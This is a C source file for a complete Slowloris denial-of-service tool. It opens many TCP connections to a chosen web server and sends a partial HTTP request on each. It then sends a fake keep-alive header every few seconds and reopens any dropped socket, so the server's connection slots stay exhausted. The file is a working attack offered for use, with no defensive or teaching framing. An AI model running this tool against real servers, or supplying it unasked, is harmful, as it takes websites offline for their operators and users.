#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<stdint.h>
#include<stdbool.h>

#include<time.h>
#include<signal.h>
#include<unistd.h>

#include<sys/socket.h>
#include<arpa/inet.h>
#include<netinet/in.h>
#include<netdb.h>

#define DEFAULT_CLIENTS 200
#define DEFAULT_PORT    80

#ifndef true
      #define true  1
      #define false 0
#endif

/* PROG START */

typedef struct _attack_details {
      unsigned char host[256];
      unsigned char * host_ip;
      int http_port;
      int clients_n;
      int * streams;
} attack_details;

typedef struct _system_arguments {
      bool set_target;
      bool set_port;
      bool set_clients;
} system_arguments;

char * hostname_to_ip(const char hostname[]) {
      struct hostent * entity = gethostbyname(hostname);
      return (entity?inet_ntoa((struct in_addr)*((struct in_addr *)entity->h_addr_list[0])):(char*)NULL);
}

bool IsArgument(const char * arg1, const char * arg2) {
      return (strcmp(arg1, arg2)?0:1);
}

void init() {
      srand(time(NULL));
      printf("\x1b[0m");
      printf("\x1b[?25l");
      return;
}

void usage_exit() {
      printf("\x1b[?25h");
      printf("Usage $ ./slowloris -host <HOST> -port <PORT NUMBER> -clients <NUMBER OF CLIENTS>\n");
      exit(-1);
}

void clean_exit() {
      printf("\x1b[?25h");
      exit(-1);
}

void newline(unsigned int n) {
      for (int i = 0; i < n; ++i) printf("%c", (char)0x0a);
      return;
}

int main(int argc, char ** argv) {
      init();

      signal(SIGSEGV, &clean_exit);
      signal(SIGINT, &clean_exit);
      signal(SIGPIPE, SIG_IGN);

      system_arguments sys_args = { .set_target = false,
                                    .set_port = false,
                                    .set_clients = false
      };

      attack_details target;

      target.http_port = DEFAULT_PORT;
      target.clients_n = DEFAULT_CLIENTS;

      for (int i = 0; i < argc; ++i) {
            if ( IsArgument(argv[i], "-host") && !sys_args.set_target ) {
                  if (i >= argc - 1) {
                        printf("[!] -host requires a value to be supplied after\n");
                        usage_exit();
                  }

                  strncpy(target.host, argv[i+1], sizeof(target.host));
                  sys_args.set_target = true;

            }

            if ( IsArgument(argv[i], "-port") && !sys_args.set_port ) {
                  if (i >= argc - 1) {
                        printf("[!] -port required a value to be supplied after\n");
                        usage_exit();
                  }

                  if (strlen(argv[i+1]) > 5) {
                        printf("[!] Invalid port number [0-65535]\n");
                        clean_exit();
                  }

                  sscanf(argv[i+1], "%d", &target.http_port);

                  if (target.http_port > 65535 || target.http_port < 0) {
                        printf("[!] Invalid port number [0-65535]\n");
                        clean_exit();
                  }

                  sys_args.set_port = true;

            }

            if (IsArgument(argv[i], "-clients") && !sys_args.set_clients ) {
                  if (i >= argc - 1) {
                        printf("[!] -clients requires a value to be supplied after\n");
                        usage_exit();
                  }

                  if (strlen(argv[i+1]) > 5) {
                        printf("[!] Too many clients\n");
                        clean_exit();
                  }

                  sscanf(argv[i+1], "%d", &target.clients_n);

                  if (target.clients_n < 0) {
                        printf("[!] Must have more than 0 clients...\n");
                        clean_exit();
                  }

                  sys_args.set_clients = true;

            }
      }

      if (!sys_args.set_target) {
            printf("[!] A -host is required\n");
            usage_exit();
      }

      struct sockaddr_in server;

      const char get_request[] = "GET /?%d HTTP/1.1\r\n";
      const char user_agent[] = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\r\n";
      const char keep_alive[] = "X-a: %d\r\n";
      const char * headers[] = {get_request, user_agent, keep_alive};

      if ((target.host_ip = hostname_to_ip(target.host)) == NULL) {
            printf("[!] Host %s cant be reached... Check connection status\n", target.host);
            return -1;
      }

      newline(1);

      printf("\033[4mHOST\033[0m    =>   %15s\n", target.host);
      printf("\033[4mHOST IP\033[0m =>   %15s\n", target.host_ip);
      printf("\033[4mPORT\033[0m    =>   %15.d\n", target.http_port);
      printf("\033[4mCLIENTS\033[0m =>   %15.d\n", target.clients_n);

      newline(1);


      server.sin_addr.s_addr = inet_addr(target.host_ip);
      server.sin_port = htons(target.http_port);
      server.sin_family = AF_INET;

      int clients[target.clients_n];
      target.streams = (int*)&clients;
      int status;
      int successful_connections = 0;

      char request[512];

      for (int i = 0; i < target.clients_n; ++i) {
            memset(request, '\0', sizeof(request));
            snprintf(request, sizeof(request), headers[0], rand() % 9999);

            target.streams[i] = socket(AF_INET, SOCK_STREAM, 0);
            if (target.streams[i] >= 0) {
                  status = connect(target.streams[i], (struct sockaddr*)&server, sizeof(server));
                  if (status >= 0) {
                        send(target.streams[i], request, strlen(request), 0);
                        status = send(target.streams[i], headers[1], strlen(headers[1]), 0);

                        if(status >= 0) {
                              successful_connections++;
                              printf("\r[+] Client #%04d created...", i + 1);
                              fflush(stdout);
                        }
                  }
            }
      }

      newline(1);

      printf("[+] %d connected clients\n", successful_connections);

      newline(1);

      int count = 1;

      while (true) {
            printf("[+] Sending bad keep-alive headers #%d\n", count++);

            memset(request, '\0', sizeof(request));

            for (int i = 0; i < target.clients_n; ++i) {
                  snprintf(request, sizeof(request), headers[2], rand() % 9999);
                  status = send(target.streams[i], request, strlen(request), 0);

                  if (status <= 0) {
                        target.streams[i] = socket(AF_INET, SOCK_STREAM, 0);
                        connect(target.streams[i], (struct sockaddr*)&server, sizeof(server));

                        snprintf(request, sizeof(request), headers[0], rand() % 9999);
                        send(target.streams[i], request, strlen(request), 0);

                        memset(request, '\0', sizeof(request));

                        snprintf(request, sizeof(request), headers[1], rand() % 9999);
                        send(target.streams[i], request, strlen(request), 0);
                  }
            }

            sleep(3);
      }

      clean_exit();
      return 0;
}
